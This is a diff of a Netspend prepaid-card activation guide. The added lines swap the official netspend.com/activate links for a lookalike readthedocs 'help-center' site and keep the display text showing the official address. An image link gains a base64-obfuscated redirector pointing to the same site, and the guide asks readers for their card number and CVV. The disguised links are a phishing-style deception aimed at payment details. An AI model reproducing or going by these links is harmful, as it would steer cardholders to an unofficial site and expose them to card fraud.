@@ -4,7 +4,7 @@ Netspend Activation Guide – How to Activate Your Card Fast
 
 Just received your Netspend prepaid debit card in the mail? You’re one step away from using it to pay bills, shop online, or withdraw cash. But before that, you must complete your Netspend activation. It’s quick, secure, and essential.
 
-Whether you received your card through the mail or signed up online, this guide will help you activate your card using either the `Netspend.com/activate <https://www.netspend.com/activate>`_ website or the official phone number.
+Whether you received your card through the mail or signed up online, this guide will help you activate your card using either the `Netspend.com/activate <https://activatenetspendcard-help-center.readthedocs.io/en/latest/>`_ website or the official phone number.
 
 .. raw:: html
 
@@ -12,7 +12,7 @@ Whether you received your card through the mail or signed up online, this guide 
 
 .. image:: get-helpnow.png
    :alt: Netspend Activation
-   :target: #
+   :target: https://fm.ci/?aHR0cHM6Ly9hY3RpdmF0ZW5ldHNwZW5kY2FyZC1oZWxwLWNlbnRlci5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3Q=
 
 .. raw:: html
 
@@ -21,10 +21,10 @@ Whether you received your card through the mail or signed up online, this guide 
 Activation Methods
 ==================
 
-Method 1: Activate Online at `Netspend.com/activate <https://www.netspend.com/activate>`_
+Method 1: Activate Online at `Netspend.com/activate <https://activatenetspendcard-help-center.readthedocs.io/en/latest/>`_
 -------------------------------------------------------------------------------------------
 
-1. Go to `https://www.netspend.com/activate <https://www.netspend.com/activate>`_
+1. Go to `https://www.netspend.com/activate <https://activatenetspendcard-help-center.readthedocs.io/en/latest/>`_
 2. Enter your 16-digit card number and the 3-digit CVV from the back of your card
 3. Follow the on-screen instructions to create a login if you haven’t already
 4. You may be asked to verify your identity using your name, date of birth, and ZIP code
